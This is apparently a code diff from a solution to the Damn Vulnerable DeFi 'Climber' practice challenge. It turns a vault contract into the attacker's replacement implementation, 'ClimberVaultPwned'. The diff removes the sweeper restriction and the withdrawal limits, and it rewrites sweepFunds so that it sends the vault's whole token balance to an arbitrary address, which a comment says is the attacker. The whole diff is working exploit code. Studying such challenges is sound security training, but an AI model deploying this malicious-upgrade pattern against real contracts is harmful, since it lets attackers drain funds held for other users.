@@ -21,58 +21,29 @@ contract ClimberVaultPwned is Initializable, OwnableUpgradeable, UUPSUpgradeable
     uint256 private _lastWithdrawalTimestamp;
     address private _sweeper;
 
-    modifier onlySweeper() {
-        require(msg.sender == _sweeper, "Caller must be sweeper");
-        _;
-    }
-
     /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() initializer {}
 
-    function initialize(address sweeper) initializer external {
-        // Initialize inheritance chain
-        __Ownable_init();
-        __UUPSUpgradeable_init();
+    /* unable to call initialize() during upgradeToAndCall(), hence had 
+        modify sweepFunds instead */
+    // function initialize(address sweeper) external initializer {
+    //     // Initialize inheritance chain
+    //     __Ownable_init();
+    //     __UUPSUpgradeable_init();
+    //     console.log("oops");
+    //     // Deploy timelock and transfer ownership to it
+    //     // transferOwnership(address(new ClimberTimelock(admin, proposer)));
 
-        // Deploy timelock and transfer ownership to it
-        // transferOwnership(address(new ClimberTimelock(admin, proposer)));
+    //     _setSweeper(sweeper);
+    //     _setLastWithdrawal(block.timestamp);
+    //     _lastWithdrawalTimestamp = block.timestamp;
+    // }
 
-        _setSweeper(sweeper);
-        _setLastWithdrawal(block.timestamp);
-        _lastWithdrawalTimestamp = block.timestamp;
-    }
-
-    // Allows the owner to send a limited amount of tokens to a recipient every now and then
-    function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
-        require(amount <= WITHDRAWAL_LIMIT, "Withdrawing too much");
-        require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, "Try later");
-        
-        _setLastWithdrawal(block.timestamp);
-
-        IERC20 token = IERC20(tokenAddress);
-        require(token.transfer(recipient, amount), "Transfer failed");
-    }
-
+    // Modifying this fn to send all tokens directly to attacker
     // Allows trusted sweeper account to retrieve any tokens
-    function sweepFunds(address tokenAddress) external onlyOwner {
+    function sweepFunds(address tokenAddress, address to) external onlyOwner {
         IERC20 token = IERC20(tokenAddress);
-        require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
-    }
-
-    function getSweeper() external view returns (address) {
-        return _sweeper;
-    }
-
-    function _setSweeper(address newSweeper) internal {
-        _sweeper = newSweeper;
-    }
-
-    function getLastWithdrawalTimestamp() external view returns (uint256) {
-        return _lastWithdrawalTimestamp;
-    }
-
-    function _setLastWithdrawal(uint256 timestamp) internal {
-        _lastWithdrawalTimestamp = timestamp;
+        require(token.transfer(to, token.balanceOf(address(this))), "Transfer failed");
     }
 
     // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
